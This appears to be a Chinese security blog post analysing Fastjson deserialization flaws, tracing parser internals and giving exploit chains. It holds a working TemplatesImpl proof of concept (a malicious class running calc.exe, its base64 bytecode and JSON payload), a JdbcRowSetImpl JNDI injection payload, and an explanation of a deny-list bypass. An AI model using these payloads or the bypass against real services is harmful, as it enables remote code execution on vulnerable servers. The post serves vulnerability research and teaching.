<h3 id="3-parse过程调试"><a href="#3-parse过程调试" class="headerlink" title="3.parse过程调试"></a>3.parse过程调试</h3><p>调用过程如下：</p>
<p><img src="/image/2414837-20220118174133297-1132976695.png" srcset="/img/loading.gif" lazyload alt="image-20220117102346305"></p>
<p><img src="/image/image-20220905160303063-16623649847141.png" srcset="/img/loading.gif" lazyload alt="image-20220905160303063"></p>
<p>调用JSON#parse()方法，后调用new DefaultJSONParser();</p>
<p><img src="/image/image-20220905160450268-16623650916213-16623650950735.png" srcset="/img/loading.gif" lazyload alt="image-20220905160450268"></p>
<p>new DefaultJSONParser()中调用ParserConfig.getGlobalInstance()，传入配置，配置中包含黑名单java.lang.Thread</p>
<p><img src="/image/image-20220906111415947-16624340578123.png" srcset="/img/loading.gif" lazyload alt="image-20220906111415947"></p>
<p>调用至DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config)</p>
<p><img src="/image/image-20220905160710420-16623652323247.png" srcset="/img/loading.gif" lazyload alt="image-20220905160710420"></p>
<p>this调用至构造方法，lexer.getCurrent()获取了lexer的ch属性，此处为获取JSON字符串的第一个字符，即{</p>
<p><img src="/image/image-20220905162236365-16623661597249.png" srcset="/img/loading.gif" lazyload alt="image-20220905162236365"></p>
<p>进入DeafultJSONParser.java通过switch判断，进入到LBRACE中，此处new JSONObject对象</p>
<p><img src="/image/image-20220210104604897.png" srcset="/img/loading.gif" lazyload alt="image-20220210104604897"></p>
<p>调用至JSONObject#JSONObject(int initialCapacity, boolean ordered)构造方法</p>
<p><img src="/image/image-20220905173804775-166237068638619.png" srcset="/img/loading.gif" lazyload alt="image-20220905173804775"></p>
<p>调用至DeafultJSONParser#parseObject(final Map object, Object fieldName)方法，此处fieldName为null,此时尚未开始解析JSON字符串</p>
<p><img src="/image/image-20220905164102745-166236726415211.png" srcset="/img/loading.gif" lazyload alt="image-20220905164102745"></p>
<p>判断下一个字符是否为 “ ,后取出”“中键名，即@type，然后判断接下来字符是否符合规则</p>
<p><img src="/image/image-20220905174430009-166237107164521.png" srcset="/img/loading.gif" lazyload alt="image-20220905174430009"></p>
<p>调用TypeUtils.loadClass(typeName, config.getDefaultClassLoader())方法获取类对象</p>
<p><img src="/image/image-20220905164830719-166236771232813.png" srcset="/img/loading.gif" lazyload alt="image-20220905164830719"></p>
<p>从map中取classNmae,map中缓存一些常用基本类，然后可以看到className.startsWith(“L”),会对L进行去除，重新loadClass，可利用此次对ClassName添加L绕过黑名单</p>
<p><img src="/image/image-20220906103214944-16624315371361.png" srcset="/img/loading.gif" lazyload alt="image-20220906103214944"></p>
<p>利用类加载器加载类，然后将对类缓存到maping对象中</p>
<p><img src="/image/image-20220905164854929-166236774004015.png" srcset="/img/loading.gif" lazyload alt="image-20220905164854929"></p>
<p>运行至ObjectDeserializer deserializer &#x3D; config.getDeserializer(clazz);</p>
<p><img src="/image/image-20220906153358338-16624496402555.png" srcset="/img/loading.gif" lazyload alt="image-20220906153358338"></p>
<p>进入ParserConfig#getDeserializer(Type type)方法后进行大量判断，下图为判断黑名单，最后进入到derializer &#x3D; createJavaBeanDeserializer(clazz, type);</p>
<p><img src="/image/image-20220906155157758-16624507203509.png" srcset="/img/loading.gif" lazyload alt="image-20220906155157758"></p>
<p><img src="/image/image-20220906153844118-16624499263317.png" srcset="/img/loading.gif" lazyload alt="image-20220906153844118"></p>
<p>经过调用createJavaBeanDeserializer()设置deserializer属性，属性如下：</p>
<p><img src="/image/image-20220906160642016-166245160388711.png" srcset="/img/loading.gif" lazyload alt="image-20220906160642016"></p>
<p><img src="/image/image-20220906160751848-166245167436613.png" srcset="/img/loading.gif" lazyload alt="image-20220906160751848"></p>
<p>最后调用DeafultJSONParser#parseObject()中deserializer.deserialze(this, clazz, fieldName),进入反序列化操作</p>
<p><img src="/image/image-20220905171235790-166236915766317.png" srcset="/img/loading.gif" lazyload alt="image-20220905171235790"></p>
<p>调用至JavaBeanDeserializer#protected <T> T deserialze()方法，后调用至getSeeAlso()</p>
<p><img src="/image/image-20220906162146410-166245250961915.png" srcset="/img/loading.gif" lazyload alt="image-20220906162146410"></p>
<p>调用至JavaBeanDeserializer()后调用至JavaBeanInfo#build()方法</p>
<p><img src="/image/image-20220906162541552-166245274334517.png" srcset="/img/loading.gif" lazyload alt="image-20220906162541552"></p>
<p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p>
<p><img src="/image/image-20220906163301544-166245318412819.png" srcset="/img/loading.gif" lazyload alt="image-20220906163301544"></p>
<p><strong>set开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li>非静态方法</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名。再去跟这个类的属性去比对有没有这个名称的属性。</p>
<p>如果没有这个属性并且这个set方法的输入是一个布尔型，会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p>
<p><strong>get开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无传入参数</li>
<li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li>
</ul>
<h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><h3 id="1-Fastjson"><a href="#1-Fastjson" class="headerlink" title="1 	Fastjson &lt;&#x3D;1.2.24"></a>1 	Fastjson &lt;&#x3D;1.2.24</h3><h4 id="1-TemplatesImpl利用链"><a href="#1-TemplatesImpl利用链" class="headerlink" title="1&gt;.TemplatesImpl利用链"></a>1&gt;.TemplatesImpl利用链</h4><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
<li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li>
<li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li>
</ol>
<p>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据。故此利用链利用条件苛刻，并不常见。</p>
<p><img src="/image/image-20220209171617414.png" srcset="/img/loading.gif" lazyload alt="image-20220209171617414"></p>
<h5 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>debug调试，JSONObject obj &#x3D; JSON.parseObject(payload1, Feature.SupportNonPublicField)处下断点;此漏洞利用方法必须要存在<code>Feature.SupportNonPublicField</code>设置（即允许private对象传入）</p>
<p><img src="/image/image-20220210094825242.png" srcset="/img/loading.gif" lazyload alt="image-20220210094825242"></p>
<p>进入JSON类中，发现JSON.parseObject()<code>调用了</code>JSON.parse()</p>
<p><img src="/image/image-20220210095210483.png" srcset="/img/loading.gif" lazyload alt="image-20220210095210483"></p>
<p>进入到JSON类#parse(String text, Feature… features)方法中，对可控长度变量的分析，这里也就是<code>Feature.SupportNonPublicField</code>的开启识别</p>
<p><img src="/image/image-20220210095334436.png" srcset="/img/loading.gif" lazyload alt="image-20220210095334436"></p>
<p>调用JSON#parse(String text, int features)，继续执行parser.parse()接口</p>
<p><img src="/image/image-20220210095627159.png" srcset="/img/loading.gif" lazyload alt="image-20220210095627159"></p>
<p>进入DeafultJSONParser.java通过switch判断，进入到LBRACE中</p>
<p><img src="/image/image-20220210104604897.png" srcset="/img/loading.gif" lazyload alt="image-20220210104604897"></p>
<p>调用deserializer.deserialze(this, clazz, fieldName)</p>
<p><img src="/image/image-20220210105038883.png" srcset="/img/loading.gif" lazyload alt="image-20220210105038883"></p>
<p>进入ParserConfig.java 进行设置</p>
<p><img src="/image/image-20220210105217734.png" srcset="/img/loading.gif" lazyload alt="image-20220210105217734"></p>
<p>进入JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName) ，进行反序列化操作</p>
<p><img src="/image/image-20220210105514778.png" srcset="/img/loading.gif" lazyload alt="image-20220210105514778"></p>
<p>设置参数是会调用FieldDeserializer.java中的setValue，已经可以看到Method方法，标志着这里触发反射</p>
<p><img src="/image/image-20220210111123619.png" srcset="/img/loading.gif" lazyload alt="image-20220210111123619"></p>
<p>前面的参数会不满足if(method !&#x3D; null)的判断，到outputProperties的时候，因为它是个类，存在method，于是进入if分支，调用方法为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</p>
<p><img src="/image/image-20220210111822121.png" srcset="/img/loading.gif" lazyload alt="image-20220210111822121"></p>
<p>在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()方法下断点，调用newTransformer()</p>
<p><img src="/image/image-20220210113532817.png" srcset="/img/loading.gif" lazyload alt="image-20220210113532817"></p>
<p>跟进调用getTransletInstance()</p>
<p><img src="/image/image-20220210113623886.png" srcset="/img/loading.gif" lazyload alt="image-20220210113623886"></p>
<p>跟进调用defineTransletClasses()s</p>
<p><img src="/image/image-20220210113839439.png" srcset="/img/loading.gif" lazyload alt="image-20220210113839439"></p>
<p>最后初始化类，触发代码执行</p>
<h5 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><p>创建恶意类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>    <br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    <br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    <br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>工具类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">FiletoBase64</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">io</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10240</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = io.read(buf)) &gt; <span class="hljs-number">0</span>) &#123;<br>        os.write(buf, <span class="hljs-number">0</span>, len);<br>    &#125;<br>    io.close();<br>    <br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());<br>    <span class="hljs-keyword">return</span> s;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> ClassBase64Util.FiletoBase64(<span class="hljs-string">&quot;E:\\JAVA-PAYLOAD\\mydemo\\target\\classes\\fastjson\\Shell.class&quot;</span>);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br><br><span class="hljs-comment">//System.out.println(payload1);</span><br><span class="hljs-comment">//&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAQTGZhc3Rqc29uL1NoZWxsOwEADVN0YWNrTWFwVGFibGUHACsHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEADmZhc3Rqc29uL1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAADgAEABEADQAUABAAEgARABMAFQAVAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAASAAAAEAAC/wAQAAEHABMAAQcAFAQAAQAVABYAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEAEAARAAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB0AAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB8ADQAAACoABAAAAAEAEAARAAAAAAABABcAGAABAAAAAQAeAB8AAgAAAAEAIAAhAAMAGwAAAAQAAQAcAAEAIgAAAAIAIw==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br><br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);<br>System.out.println(obj);<br></code></pre></td></tr></table></figure>

<h4 id="2-JdbcRowSetImpl利用链"><a href="#2-JdbcRowSetImpl利用链" class="headerlink" title="2&gt;.JdbcRowSetImpl利用链"></a>2&gt;.JdbcRowSetImpl利用链</h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><p>JdbcRowSetImpl利用链为利用JNDI注入，利用条件为不用JAVA版本下RMI、LDAP限制条件，高版本使用高版本绕过技术</p>
<h5 id="利用链分析：-1"><a href="#利用链分析：-1" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>JdbcRowSetImpl#setAutoCommit()方法如下：</p>
<p><img src="/image/image-20220907103135441-16625178971631.png" srcset="/img/loading.gif" lazyload alt="image-20220907103135441"></p>
<p>Fastjson会自动调用setAutoCommit()方法，conn默认为空，进入else执行this.conn &#x3D; this.connect();方法如下：</p>
<p><img src="/image/image-20220907103515820-16625181177893.png" srcset="/img/loading.gif" lazyload alt="image-20220907103515820"></p>
<p>conn默认为空，若this.getDataSourceName() !&#x3D; null则进入else if,调用至lookup(this.getDataSourceName()</p>
<p>故此处存在JNDI注入，payload为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-20220907112138942-16625209008225.png" srcset="/img/loading.gif" lazyload alt="image-20220907112138942"></p>
<h5 id="PAYLOAD-1"><a href="#PAYLOAD-1" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="21-2-25"><a href="#21-2-25" class="headerlink" title="2	1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41"></a>2	1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</h3><h4 id="PAYLOAD1"><a href="#PAYLOAD1" class="headerlink" title="PAYLOAD1"></a>PAYLOAD1</h4><h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><p>开启autoTypeSupport,影响版本1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p>
<h5 id="利用链分析：-2"><a href="#利用链分析：-2" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>FastJSON1.2.24</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="hljs-built_in">this</span>.config.getDefaultClassLoader());<br></code></pre></td></tr></table></figure>

<p>FastJSON1.2.25</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = <span class="hljs-built_in">this</span>.config.checkAutoType(ref, (Class)<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>

<p>获取类对象的方法由 TypeUtils.loadClass 变成了this.config.checkAutoType</p>
<p>Fastjson1.2.25中com.alibaba.fastjson.parser.ParserConfig类进行了修改修改，添加属性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> autoTypeSupport; <span class="hljs-comment">//控制是否可进行反序列化，默认为false</span><br><span class="hljs-keyword">private</span> String[] denyList;		<span class="hljs-comment">//黑名单</span><br><span class="hljs-keyword">private</span> String[] acceptList;	<span class="hljs-comment">//白名单</span><br></code></pre></td></tr></table></figure>

<p><img src="/image/image-20220908100501152-16626027031855.png" srcset="/img/loading.gif" lazyload alt="image-20220908100501152"></p>
<p>构造方法中对黑白名单进行赋值</p>
<p><img src="/image/image-20220908102206222-16626037279307.png" srcset="/img/loading.gif" lazyload alt="image-20220908102206222"></p>
<p>com.alibaba.fastjson.parser.DefaultJSONParser中parseObject()方法中调用ParserConfig#checkAutoType()</p>
<p><img src="/image/image-20220908102648098-16626040098489.png" srcset="/img/loading.gif" lazyload alt="image-20220908102648098"></p>
<p>checkAutoType()中对autoTypeSupport进行判断，若为true则先进行白名单校验，若为白名单内则进入TypeUtils.loadClass，后再进行黑名单校验，若在黑名单中则抛出异常，若未在黑名单中则在Map中查找类</p>
<p><img src="/image/image-20220908100111279-16626024730933.png" srcset="/img/loading.gif" lazyload alt="image-20220908100111279"></p>
<p>若autoTypeSupport为false,则进行黑名单判断，再进行白名单判断，最后若autoTypeSupport&#x3D;true，会再一次进行判断然后进入到TypeUtils.loadClass中</p>
<p><img src="/image/image-20220908094528661-16626015314011.png" srcset="/img/loading.gif" lazyload alt="image-20220908094528661"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>    String accept;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>        accept = <span class="hljs-built_in">this</span>.denyList[i];<br>        <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.acceptList.length; ++i) &#123;<br>        accept = <span class="hljs-built_in">this</span>.acceptList[i];<br>        <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>com.alibaba.fastjson.util.TypeUtils#loadClass()中对[ L ;进行了处理，而其中在处理L ;的时候存在了逻辑漏洞，可以在className的前后分别加上L ;来进行绕过</p>
<p><img src="/image/image-20220908111904169-166260714586611.png" srcset="/img/loading.gif" lazyload alt="image-20220908111904169"></p>
